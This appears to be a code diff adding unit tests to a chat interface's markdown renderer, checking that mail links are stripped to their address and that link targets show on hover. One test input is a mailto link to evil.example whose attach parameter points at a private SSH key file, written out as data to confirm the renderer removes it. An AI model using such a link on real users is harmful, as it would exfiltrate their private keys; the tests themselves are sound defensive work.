@@ -1748,6 +1748,17 @@ class PaneMarkdownTests(unittest.TestCase):
         self.assertEqual(re.findall(r'href="([^"]*)"', html), ["https://example.org/x", "https://example.com/y"])
         self.assertIn(" b", html)  # (as text)
         self.assertIn(" c ", html)
+        # a mail link to its addresses only (?attach= would put a file of yours in the mail)
+        html = markdown('Md.toHtml("[m](mailto:a@evil.example?attach=/home/you/.ssh/id_ed25519&body=x)", style)')
+        self.assertEqual(re.findall(r'href="([^"]*)"', html), ["mailto:a@evil.example"])
+
+    def test_a_links_address_shows_before_the_click(self):
+        # [github.com/…](https://evil.example/) showed the GitHub words and opened the other site
+        ui = CODE.parent / "ui"
+        pane = (ui / "ChatPane.qml").read_text()
+        self.assertIn("onLinkHovered: link => pane.linkHovered(replyText, link, replyHover.point.position)", pane)
+        self.assertIn('active: pane.linkShown !== "" && pane.linkBox !== null', pane)   # (made only while hovered)
+        self.assertIn('active: planText.hoveredLink !== ""', (ui / "PermissionAsk.qml").read_text())
 
     def test_a_link_keeps_parentheses_in_its_address(self):
         html = markdown('Md.toHtml("[C](https://en.wikipedia.org/wiki/C_(programming_language)) and [x](https://a.b/c).", style)')
